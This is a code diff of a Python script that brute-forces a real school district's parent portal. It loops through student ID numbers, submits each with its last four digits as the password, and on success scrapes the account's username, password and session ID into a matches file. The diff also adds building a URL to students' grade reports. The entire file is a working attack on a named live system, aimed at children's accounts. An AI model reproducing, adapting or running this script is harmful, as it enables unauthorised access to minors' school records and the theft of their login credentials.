@@ -1,7 +1,6 @@
-from colored import fg, bg, attr
+from colored import fg, attr
 import mechanize
 from bs4 import BeautifulSoup
-import os
 import time
 
 br = mechanize.Browser()
@@ -25,31 +24,23 @@ class user:
     username = "N/A"
     password = "N/A"
     birthmonth = "N/A"
+    school = "N/A"
+    fullname = "N/A"
 
 
-# Declare user class
+# Set smurf class
+class smurf:
+    id = "N/A"
+    full = "N/A"
+    randid = "N/A"
+
+
+# Declare vars
 user = user()
+domain = "https://dashboard.okaloosaschools.com"
 
-
-# Check for internet
-def check_ping():
-    hostname = "gnu.org"
-    response = os.system("ping -c 1 " + hostname)
-    # Check response
-    if response == 0:
-        pingstatus = "[RUN] " + green + \
-            "Network connection successful..." + res
-    else:
-        pingstatus = "[ERR] " + red + \
-            "Network connection failed cannot continue..." + res
-    return pingstatus
-
-
-print(check_ping())
 
 # Declare custom strip function
-
-
 def downwithit(string, firstHalf, secondHalf):
     string = str(string)
     format1 = string.replace(str(firstHalf), "")
@@ -58,38 +49,35 @@ def downwithit(string, firstHalf, secondHalf):
 
 
 # Main function
-for x in range(4624021140, 4699999999):
-    br.open("https://dashboard.okaloosaschools.com/parentportal/PP000.pgm")
+for x in range(4630051162, 4699999999):
+    br.open(domain + "/parentportal/PP000.pgm")
     br.select_form(nr=0)
     user.studentid = str(x)
-
-    # Set bruteforce combo
     br.form['wrkuser'] = user.studentid
     br.form['wrkpasswd'] = user.studentid[-4:]
     print("[RUN] Checking %s..." % user.studentid)
     response = br.submit()
     try:
-        # Try to select form, if missing then combo was found
         br.select_form(nr=0)
     except mechanize._mechanize.FormNotFoundError:
         start = time.time()
-        # Notify there was a match
-        print("[RUN] " + green + "Found " + user.studentid + "..." + res)
-
-        # Retrieve redirect url embedded in js code
+        print("[RUN] " + green
+              + "Found " + user.fullname + "..." + res)
         soup = BeautifulSoup(br.response().read(), 'lxml')
-        formatted = str(soup)
-        newUrl = downwithit(
-            formatted, "<html><head></head><body nosplash=\"\" onload=\"location.replace('", "');\"></body></html>")
-        br.open("https://dashboard.okaloosaschools.com" + newUrl)
-
-        # # Scrape and format web data
+        redirect = str(soup)[63:146]
+        dashboard = domain + redirect
+        br.open(dashboard)
         soup = BeautifulSoup(br.response().read(), 'lxml')
+
+        # Get username/password
         tempCombo = []
         for span in soup.select("td span"):
             tempCombo.append(span.text)
         user.username = tempCombo[0]
         user.password = tempCombo[1]
+        smurf.id = dashboard[69:101]
+        finalSmurf = domain + "/parentportal/PP013.pgm?SmurfId= " + \
+            smurf.id + "&wrkcycle=02&wrkgrd=11&rcyear=2022"
 
         # Write to file
         f = open("./assets/matches.txt", "a")
@@ -97,9 +85,12 @@ for x in range(4624021140, 4699999999):
                 + user.username + "\nPassword: " + user.password + "\n\n")
         f.close()
 
-        # Debug process time
+        # Time
         end = time.time()
-        delta = end - start
-        print("[DEBUG] " + orange
-              + "Took " + str(round(delta, 2)) + "s to process match..." + res)
+        delta = str(round(end - start, 2))
+        print(" L " + green + "Scraped " + user.studentid + "..." + res)
+        print(" L " + green + "Scraped " + user.username + "..." + res)
+        print(" L " + green + "Scraped " + user.password + "..." + res)
+        print(" L " + green + "Scraped " + smurf.id + "..." + res)
+        print(" L " + orange + "Took " + delta + "s to process match..." + res)
         pass
